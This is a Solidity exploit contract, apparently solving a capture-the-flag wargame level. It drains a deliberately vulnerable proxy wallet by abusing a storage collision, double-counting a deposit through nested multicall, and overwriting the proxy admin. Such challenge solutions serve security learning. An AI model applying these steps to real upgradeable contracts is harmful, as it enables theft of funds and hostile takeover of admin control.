// SPDX-License-Identifier: Unlicense
import "src/PuzzleWallet/PuzzleWallet.sol";
import "exploits/BlockUtils.sol";

contract PuzzleWalletExploit is BlockUtils {

    PuzzleProxy public proxy;
    PuzzleWallet public wallet;

    constructor(address _victim) {
        proxy = PuzzleProxy(payable(_victim));
        wallet = PuzzleWallet(address(proxy));
    }

    function hack() public payable {
        // Step 1: Become the owner by proposing ourselves as the new admin
        proxy.proposeNewAdmin(address(this)); // pendingAdmin = address(this), overlaps owner

        // Step 2: Add ourselves to the whitelist
        wallet.addToWhitelist(address(this));

        // Step 3: Prepare data for nested multicall to bypass the deposit limit
        bytes[] memory depositCallData = new bytes[](1);
        depositCallData[0] = abi.encodeWithSelector(wallet.deposit.selector);

        bytes[] memory multicallData = new bytes[](2);
        multicallData[0] = abi.encodeWithSelector(wallet.deposit.selector);
        multicallData[1] = abi.encodeWithSelector(wallet.multicall.selector, depositCallData);

        // Step 4: Call multicall with nested multicall to increase our balance without additional Ether
        wallet.multicall{value: 0.001 ether}(multicallData);

        // Step 5: Execute to withdraw the entire balance to ourselves
        uint256 balance = wallet.balances(address(this));
        wallet.execute(payable(address(this)), balance, "");

        // Step 6: Set maxBalance to our address, which overwrites proxy.admin due to storage collision
        wallet.setMaxBalance(uint256(uint160(address(this))));
    }

    receive() external payable {
    }
}